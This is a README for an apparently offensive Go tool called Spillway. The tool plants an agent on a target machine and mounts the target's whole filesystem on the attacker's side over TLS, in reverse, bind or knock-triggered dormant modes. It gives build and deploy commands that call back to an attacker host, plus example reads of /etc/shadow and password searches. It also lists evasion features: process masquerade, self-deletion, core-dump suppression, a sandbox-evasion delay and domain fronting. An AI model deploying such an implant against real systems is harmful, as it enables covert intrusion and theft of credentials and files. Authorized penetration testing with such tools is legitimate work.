<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Spillway/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Spillway/main/docs/assets/logo-light.svg">
  <img alt="Spillway" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Spillway/main/docs/assets/logo-dark.svg" width="520">
</picture>

![Go](https://img.shields.io/badge/language-Go-00ADD8.svg)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows%20%7C%20macOS-lightgrey)
![License](https://img.shields.io/badge/license-MIT-blue.svg)

**Reverse/bind/dormant FUSE filesystem mount for penetration testing**

Deploy a small agent on the target, mount its entire filesystem locally via FUSE, and browse with standard tools — over TLS 1.3 with mutual PSK authentication. SSHFS without SSH, built for offense.

> **Authorization Required**: This tool is designed exclusively for authorized security testing with explicit written permission. Unauthorized access to computer systems is illegal and may result in criminal prosecution.

[Quick Start](#quick-start) • [Modes](#modes) • [Operations](#operations) • [Security Features](#security-features) • [Architecture](#architecture) • [Configuration](#configuration)

</div>

---

## Highlights

<table>
<tr>
<td width="50%">

**Reverse, Bind & Dormant**
Agent calls back (reverse), listens (bind), or sits silent until an authenticated knock triggers a callback (dormant). All modes over TLS 1.3 with optional certificate fingerprint pinning.

**Full FUSE Mount**
Real mountpoint on your machine. Use `ls`, `cat`, `cp`, `grep`, `find`, `vim` — any tool that reads files works transparently against the remote filesystem.

**Mutual PSK Auth**
Two-round HMAC-SHA256 challenge-response authentication. Both sides prove key possession before any filesystem operations begin. Empty PSKs rejected.

**Static Binary**
`CGO_ENABLED=0`, zero external dependencies on the agent. Single binary, cross-compiled for linux/windows/darwin on amd64/arm64.

</td>
<td width="50%">

**Opsec Hardened**
Process masquerade, core dump prevention, self-delete, stdout/stderr silencing. All configuration baked at compile time — zero runtime args, nothing in `/proc/cmdline`.

**Path Jailing**
Symlink-aware path resolution with configurable exclude lists. Agent resolves all symlinks before checking jail boundaries — no escape via `..` or symlinks.

**Proxy Support**
HTTP CONNECT proxy tunneling with optional Basic auth. Reach targets through corporate proxies with automatic buffered connection handling.

**Rate Limiting**
Token bucket rate limiter controls outbound bandwidth. Blend into normal traffic patterns during long-running operations.

</td>
</tr>
</table>

---

## Quick Start

### Prerequisites

<table>
<tr>
<th>Requirement</th>
<th>Version</th>
<th>Purpose</th>
</tr>
<tr>
<td>Go</td>
<td>1.22+</td>
<td>Compiler toolchain</td>
</tr>
<tr>
<td>FUSE</td>
<td>libfuse / macFUSE</td>
<td>Listener-side FUSE mount</td>
</tr>
<tr>
<td>Platform</td>
<td>Linux, macOS (listener) / Linux, Windows, macOS (agent)</td>
<td>Agent runs anywhere, listener needs FUSE</td>
</tr>
</table>

### Build

```bash
# Clone repository
git clone https://github.com/Real-Fruit-Snacks/Spillway.git
cd Spillway

# Build listener
make listener

# Build agent — reverse mode (PSK auto-generated)
./build.sh reverse 10.10.14.5:443

# Build agent — bind mode
./build.sh bind 0.0.0.0:8443

# Build agent — dormant mode (knock-to-reverse)
./build.sh dormant 10.10.14.5:443 --knock-port 49152

# Build all 5 platforms at once
./build.sh reverse 10.10.14.5:443 --all
```

### Verification

```bash
# Reverse mode — listener waits for agent callback
./bin/spillway listen --port 443 --mount ./target --key $(cat .psk)

# Deploy agent on target, then browse:
ls ./target/
cat ./target/etc/shadow
grep -r "password" ./target/etc/
find ./target/ -perm -4000

# Bind mode — connect to listening agent
./bin/spillway connect TARGET:8443 --mount ./target --key <PSK>

# Dormant mode — send knock to wake agent, then catch callback
./bin/spillway knock TARGET --port 49152 --key <PSK>

# Check active sessions
./bin/spillway status

# Clean unmount
./bin/spillway unmount ./target
```

---

## Modes

### Reverse

Agent dials back to attacker-controlled listener. The listener creates a FUSE mount of the remote filesystem.

```bash
# Attacker: build agent, start listener
./build.sh reverse 10.10.14.5:443
./bin/spillway listen --port 443 --mount ./target --key $(cat .psk)

# Target: run agent (zero args — config baked at compile time)
./spillway-agent-linux-amd64
```

### Bind

Agent listens on the target. Attacker connects and mounts the filesystem.

```bash
# Build agent in bind mode
./build.sh bind 0.0.0.0:8443

# Target: run agent
./spillway-agent-linux-amd64

# Attacker: connect and mount
./bin/spillway connect TARGET:8443 --mount ./target --key <PSK>
```

### Dormant

Agent sits silent with no open ports. An authenticated UDP knock triggers a reverse callback.

```bash
# Build agent in dormant mode
./build.sh dormant 10.10.14.5:443 --knock-port 49152

# Target: run agent (silent, no listeners)
./spillway-agent-linux-amd64

# Attacker: send knock, then listen for callback
./bin/spillway knock TARGET --port 49152 --key <PSK>
./bin/spillway listen --port 443 --mount ./target --key <PSK>
```

---

## Operations

17 filesystem operations mapped through FUSE to the remote agent:

<table>
<tr>
<th>Operation</th>
<th>Message Type</th>
<th>Description</th>
</tr>
<tr><td>Stat</td><td><code>MsgStat</code></td><td>File/directory metadata (size, mode, timestamps, uid/gid)</td></tr>
<tr><td>ReadDir</td><td><code>MsgReadDir</code></td><td>Directory listing with entry types and modes</td></tr>
<tr><td>ReadFile</td><td><code>MsgReadFile</code></td><td>Partial file read (offset + size)</td></tr>
<tr><td>ReadLink</td><td><code>MsgReadLink</code></td><td>Symlink target resolution</td></tr>
<tr><td>WriteFile</td><td><code>MsgWriteFile</code></td><td>Write data at offset</td></tr>
<tr><td>Create</td><td><code>MsgCreate</code></td><td>Create new file with mode</td></tr>
<tr><td>Mkdir</td><td><code>MsgMkdir</code></td><td>Create directory</td></tr>
<tr><td>Remove</td><td><code>MsgRemove</code></td><td>Delete file or empty directory</td></tr>
<tr><td>Rename</td><td><code>MsgRename</code></td><td>Move/rename file or directory</td></tr>
<tr><td>Chmod</td><td><code>MsgChmod</code></td><td>Change file permissions</td></tr>
<tr><td>Truncate</td><td><code>MsgTruncate</code></td><td>Truncate file to size</td></tr>
<tr><td>GetXattr</td><td><code>MsgGetXattr</code></td><td>Read extended attribute by name</td></tr>
<tr><td>ListXattr</td><td><code>MsgListXattr</code></td><td>List extended attribute names</td></tr>
<tr><td>Chown</td><td><code>MsgChown</code></td><td>Change file ownership (uid/gid)</td></tr>
<tr><td>Symlink</td><td><code>MsgSymlink</code></td><td>Create symbolic link</td></tr>
<tr><td>Link</td><td><code>MsgLink</code></td><td>Create hard link</td></tr>
<tr><td>Statfs</td><td><code>MsgStatfs</code></td><td>Filesystem statistics (total/free/avail)</td></tr>
</table>

---

## Security Features

### Encryption & Authentication

<table>
<tr>
<th>Layer</th>
<th>Implementation</th>
<th>Details</th>
</tr>
<tr>
<td>Transport</td>
<td>TLS 1.3</td>
<td>Ephemeral self-signed ECDSA certificates, optional fingerprint pinning</td>
</tr>
<tr>
<td>Authentication</td>
<td>HMAC-SHA256 PSK</td>
<td>2-round mutual challenge-response, empty keys rejected</td>
</tr>
<tr>
<td>Frame protection</td>
<td>16 MiB cap</td>
<td>Maximum frame size prevents memory exhaustion</td>
</tr>
<tr>
<td>Allocation guards</td>
<td>Length validation</td>
<td>Array/string lengths validated before allocation</td>
</tr>
</table>

### OpSec Features

<table>
<tr>
<th>Feature</th>
<th>Platform</th>
<th>Description</th>
</tr>
<tr>
<td>Process Masquerade</td>
<td>Linux, Darwin, Windows</td>
<td>Overwrites process name to blend with system processes</td>
</tr>
<tr>
<td>Core Dump Prevention</td>
<td>Linux</td>
<td>Disables core dumps via <code>prctl</code> to prevent memory forensics</td>
</tr>
<tr>
<td>Self-Delete</td>
<td>All</td>
<td>Removes binary from disk after execution</td>
</tr>
<tr>
<td>Stdout/Stderr Silencing</td>
<td>All</td>
<td>Agent produces zero console output</td>
</tr>
<tr>
<td>Zero Runtime Args</td>
<td>All</td>
<td>All config injected via <code>-ldflags</code> at compile time — nothing in <code>/proc/cmdline</code></td>
</tr>
<tr>
<td>Startup Delay</td>
<td>All</td>
<td>Configurable delay before connection (sandbox evasion, max 3600s)</td>
</tr>
</table>

### Detection Considerations

**Hidden from:**
- `ps aux` — Process masquerade shows false name
- `/proc/<pid>/cmdline` — Zero arguments, nothing to inspect
- Basic file inspection — Self-delete removes binary post-execution
- Passive traffic inspection — TLS 1.3 encrypts all filesystem operations

**Visible to:**
- `strace`, `dtrace`, `eBPF` — System call tracing reveals FUSE operations
- Network monitoring — Connection patterns and metadata remain observable
- EDR/XDR solutions — Behavioral analysis may detect anomalies
- Kernel security modules — SELinux/AppArmor may flag FUSE or network activity
- Memory forensics — Keys and buffers recoverable from RAM dumps

---

## Architecture

```
Spillway/
├── cmd/spillway/
│   ├── main.go               # Entry point, mode dispatch
│   ├── config.go             # Compile-time config vars (ldflags)
│   ├── agent_run.go          # Agent mode (//go:build agent)
│   └── listener_run.go       # Listener CLI (//go:build !agent)
├── internal/
│   ├── protocol/
│   │   ├── protocol.go       # Message types, version, constants
│   │   ├── messages.go       # Binary marshal/unmarshal, wire format
│   │   └── errors.go         # Protocol errors, errno mapping
│   ├── transport/
│   │   ├── conn.go           # FramedConn (length-prefixed I/O)
│   │   ├── tls.go            # TLS 1.3 config, PSK auth, cert pinning
│   │   ├── multiplex.go      # ClientMux + ServerMux (request/response)
│   │   └── proxy.go          # HTTP CONNECT proxy tunneling
│   ├── agent/
│   │   ├── agent.go          # Agent main loop, reconnect logic
│   │   ├── knock.go          # AF_PACKET knock listener (dormant mode)
│   │   ├── fsops.go          # 17 filesystem operation handlers
│   │   ├── pathjail.go       # Path resolution, symlink jail, excludes
│   │   ├── ratelimit.go      # Token bucket rate limiter
│   │   └── opsec.go          # Process masquerade, core dumps, self-delete
│   ├── fuse/
│   │   ├── bridge.go         # Bridge interface (FUSE <-> session)
│   │   ├── fs.go             # FUSE FS root, error mapping
│   │   ├── dir.go            # Directory node (Lookup, ReadDirAll)
│   │   ├── file.go           # File node (Read, Write, Readlink)
│   │   └── mount.go          # Mount/unmount, signal handling
│   ├── listener/
│   │   ├── listener.go       # Connection accept, session lifecycle
│   │   └── session.go        # Bridge impl, cache integration
│   ├── cache/
│   │   └── cache.go          # TTL cache (stat 5s, dir 5s)
│   └── config/
│       └── config.go         # Shared configuration types
├── build.sh                  # Agent build orchestrator
├── Makefile                  # Build targets
└── docs/
    ├── index.html            # GitHub Pages site
    └── assets/
        ├── logo-dark.svg     # Logo for dark theme
        └── logo-light.svg    # Logo for light theme
```

### Execution Flow

| Phase | Description |
|-------|-------------|
| 1. Build | `build.sh` injects config via `-ldflags -X`, cross-compiles static binary |
| 2. Deploy | Agent binary transferred to target (zero args, zero config files) |
| 3. Opsec | Agent masquerades process, disables core dumps, optionally self-deletes |
| 4. Connect | Reverse: agent dials listener. Bind: agent listens. Dormant: waits for knock, then dials |
| 5. Auth | TLS 1.3 handshake, then 2-round HMAC-SHA256 PSK mutual authentication |
| 6. Mux | ClientMux (listener) and ServerMux (agent) multiplex requests over single conn |
| 7. Mount | Listener creates FUSE mount, FUSE kernel calls route through ClientMux |
| 8. Operate | `ls`/`cat`/`grep` on mountpoint -> FUSE -> ClientMux -> agent -> filesystem -> response |

### Concurrency Model

<table>
<tr>
<th>Component</th>
<th>Workers</th>
<th>Purpose</th>
</tr>
<tr><td>ServerMux worker pool</td><td>64</td><td>Parallel filesystem operations on agent</td></tr>
<tr><td>ClientMux inflight</td><td>64</td><td>Concurrent FUSE requests from listener</td></tr>
<tr><td>Reader goroutine</td><td>1</td><td>Deserialize incoming frames (each side)</td></tr>
<tr><td>Writer goroutine</td><td>1</td><td>Serialize outgoing frames (each side)</td></tr>
<tr><td>Cache evictor</td><td>1</td><td>Background TTL eviction every 30s</td></tr>
</table>

---

## Configuration

All agent configuration is injected at compile time via `-ldflags -X`. The agent binary takes zero arguments and exposes nothing in process listings.

<table>
<tr>
<th>Category</th>
<th>Flag</th>
<th>Description</th>
<th>Default</th>
</tr>
<tr><td>Mode</td><td><code>reverse</code> / <code>bind</code> / <code>dormant</code></td><td>Connection direction (positional)</td><td>—</td></tr>
<tr><td>Address</td><td><code>HOST:PORT</code></td><td>Listener or bind address (positional)</td><td>—</td></tr>
<tr><td>Auth</td><td><code>--key KEY</code></td><td>Pre-shared key (base64)</td><td>auto-generated</td></tr>
<tr><td>TLS</td><td><code>--sni HOST</code></td><td>SNI hostname for domain fronting</td><td>random from pool</td></tr>
<tr><td>Filesystem</td><td><code>--root PATH</code></td><td>Agent filesystem root</td><td><code>/</code></td></tr>
<tr><td>Exclusions</td><td><code>--exclude PATHS</code></td><td>Comma-separated path prefixes to hide</td><td>OS defaults</td></tr>
<tr><td>Permissions</td><td><code>--read-only</code></td><td>Reject all write operations</td><td><code>false</code></td></tr>
<tr><td>Opsec</td><td><code>--procname NAME</code></td><td>Process name masquerade</td><td>OS-aware default</td></tr>
<tr><td>Opsec</td><td><code>--self-delete</code></td><td>Delete binary after execution</td><td><code>false</code></td></tr>
<tr><td>Opsec</td><td><code>--delay N</code></td><td>Startup delay in seconds (max 3600)</td><td><code>0</code></td></tr>
<tr><td>Network</td><td><code>--knock-port PORT</code></td><td>UDP knock port for dormant mode</td><td><code>49152</code></td></tr>
<tr><td>Network</td><td><code>--proxy ADDR</code></td><td>HTTP CONNECT proxy address</td><td>—</td></tr>
<tr><td>Network</td><td><code>--rate-limit N</code></td><td>Outbound bandwidth limit (tokens/sec)</td><td>—</td></tr>
<tr><td>Network</td><td><code>--rate-burst N</code></td><td>Rate limit burst size</td><td>—</td></tr>
<tr><td>Network</td><td><code>--proxy-user USER</code></td><td>Proxy username (Basic auth)</td><td>—</td></tr>
<tr><td>Network</td><td><code>--proxy-pass PASS</code></td><td>Proxy password (Basic auth)</td><td>—</td></tr>
<tr><td>Build</td><td><code>--os OS</code></td><td>Target OS (linux/windows/darwin)</td><td><code>linux</code></td></tr>
<tr><td>Build</td><td><code>--arch ARCH</code></td><td>Target architecture (amd64/arm64)</td><td><code>amd64</code></td></tr>
<tr><td>Build</td><td><code>--all</code></td><td>Build all 5 platform combinations</td><td>—</td></tr>
<tr><td>Build</td><td><code>--compress</code></td><td>UPX compress the binary</td><td><code>false</code></td></tr>
<tr><td>Build</td><td><code>--dry-run</code></td><td>Preview build command without executing</td><td>—</td></tr>
<tr><td>Build</td><td><code>--show-key</code></td><td>Display PSK in build summary</td><td><code>false</code></td></tr>
</table>

### Build Targets

```bash
make listener              # Build listener binary
make test                  # Run full test suite
./build.sh reverse ADDR    # Build reverse mode agent
./build.sh bind ADDR       # Build bind mode agent
./build.sh dormant ADDR    # Build dormant mode agent
```

### Exit Codes

<table>
<tr><th>Code</th><th>Meaning</th></tr>
<tr><td><code>0</code></td><td>Success / clean unmount</td></tr>
<tr><td><code>1</code></td><td>Connection error</td></tr>
<tr><td><code>2</code></td><td>Authentication failure</td></tr>
<tr><td><code>3</code></td><td>FUSE mount error</td></tr>
<tr><td><code>4</code></td><td>Build error</td></tr>
<tr><td><code>5</code></td><td>General error</td></tr>
</table>

---

## Platform Support

<table>
<tr>
<th>Capability</th>
<th>Linux</th>
<th>macOS</th>
<th>Windows</th>
</tr>
<tr>
<td>Agent (reverse)</td>
<td>Full</td>
<td>Full</td>
<td>Full</td>
</tr>
<tr>
<td>Agent (bind)</td>
<td>Full</td>
<td>Full</td>
<td>Full</td>
</tr>
<tr>
<td>Agent (dormant)</td>
<td>Full (AF_PACKET)</td>
<td>Not supported</td>
<td>Not supported</td>
</tr>
<tr>
<td>Listener / FUSE mount</td>
<td>Full (libfuse)</td>
<td>Full (macFUSE)</td>
<td>Not supported</td>
</tr>
<tr>
<td>Process Masquerade</td>
<td>Full</td>
<td>Partial</td>
<td>Partial</td>
</tr>
<tr>
<td>Core Dump Prevention</td>
<td>Full (<code>prctl</code>)</td>
<td>Not supported</td>
<td>Not supported</td>
</tr>
<tr>
<td>Self-Delete</td>
<td>Immediate</td>
<td>Immediate</td>
<td>Immediate</td>
</tr>
<tr>
<td>Extended Attributes</td>
<td>Full</td>
<td>Full</td>
<td>Not supported</td>
</tr>
<tr>
<td>Proxy Tunneling</td>
<td>Full</td>
<td>Full</td>
<td>Full</td>
</tr>
</table>

---

## Security

### Vulnerability Reporting

**Report security issues via:**
- GitHub Security Advisories (preferred)
- Private disclosure to maintainers
- Responsible disclosure timeline (90 days)

**Do NOT:**
- Open public GitHub issues for vulnerabilities
- Disclose before coordination with maintainers
- Exploit vulnerabilities in unauthorized contexts

### Threat Model

**In scope:**
- Encrypting filesystem operations in transit between operator-controlled endpoints
- Hiding from basic process inspection and filesystem forensics
- Authorized testing with known monitoring environments

**Out of scope:**
- Evading advanced EDR/XDR behavioral analysis
- Anti-forensics or evidence destruction
- Defeating kernel security modules (SELinux/AppArmor)
- Sophisticated traffic analysis evasion

### What Spillway Does NOT Do

Spillway is a **FUSE filesystem mount**, not an offensive framework:

- **Not a C2 framework** — No implant management, tasking queues, or beaconing
- **Not a file transfer tool** — Provides transparent filesystem access, not bulk transfer
- **Not an exploit framework** — No payload generation or exploit modules
- **Not anti-forensics** — Does not destroy evidence or tamper with logs

---

## License

MIT License

Copyright &copy; 2026 Real-Fruit-Snacks

```
THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND.
THE AUTHORS ARE NOT LIABLE FOR ANY DAMAGES ARISING FROM USE.
USE AT YOUR OWN RISK AND ONLY WITH PROPER AUTHORIZATION.
```

---

## Resources

- **GitHub**: [github.com/Real-Fruit-Snacks/Spillway](https://github.com/Real-Fruit-Snacks/Spillway)
- **Issues**: [Report a Bug](https://github.com/Real-Fruit-Snacks/Spillway/issues)
- **Security**: [SECURITY.md](SECURITY.md)
- **Contributing**: [CONTRIBUTING.md](CONTRIBUTING.md)
- **Changelog**: [CHANGELOG.md](CHANGELOG.md)

---

<div align="center">

**Part of the Real-Fruit-Snacks water-themed security toolkit**

[Aquifer](https://github.com/Real-Fruit-Snacks/Aquifer) • [Cascade](https://github.com/Real-Fruit-Snacks/Cascade) • [Conduit](https://github.com/Real-Fruit-Snacks/Conduit) • [Deadwater](https://github.com/Real-Fruit-Snacks/Deadwater) • [Deluge](https://github.com/Real-Fruit-Snacks/Deluge) • [Depth](https://github.com/Real-Fruit-Snacks/Depth) • [Dew](https://github.com/Real-Fruit-Snacks/Dew) • [Droplet](https://github.com/Real-Fruit-Snacks/Droplet) • [Fathom](https://github.com/Real-Fruit-Snacks/Fathom) • [Flux](https://github.com/Real-Fruit-Snacks/Flux) • [Grotto](https://github.com/Real-Fruit-Snacks/Grotto) • [HydroShot](https://github.com/Real-Fruit-Snacks/HydroShot) • [Maelstrom](https://github.com/Real-Fruit-Snacks/Maelstrom) • [Rapids](https://github.com/Real-Fruit-Snacks/Rapids) • [Ripple](https://github.com/Real-Fruit-Snacks/Ripple) • [Riptide](https://github.com/Real-Fruit-Snacks/Riptide) • [Runoff](https://github.com/Real-Fruit-Snacks/Runoff) • [Seep](https://github.com/Real-Fruit-Snacks/Seep) • [Shallows](https://github.com/Real-Fruit-Snacks/Shallows) • [Siphon](https://github.com/Real-Fruit-Snacks/Siphon) • [Slipstream](https://github.com/Real-Fruit-Snacks/Slipstream) • **Spillway** • [Surge](https://github.com/Real-Fruit-Snacks/Surge) • [Tidemark](https://github.com/Real-Fruit-Snacks/Tidemark) • [Tidepool](https://github.com/Real-Fruit-Snacks/Tidepool) • [Undercurrent](https://github.com/Real-Fruit-Snacks/Undercurrent) • [Undertow](https://github.com/Real-Fruit-Snacks/Undertow) • [Vapor](https://github.com/Real-Fruit-Snacks/Vapor) • [Wellspring](https://github.com/Real-Fruit-Snacks/Wellspring) • [Whirlpool](https://github.com/Real-Fruit-Snacks/Whirlpool)

*Remember: With great power comes great responsibility.*

</div>
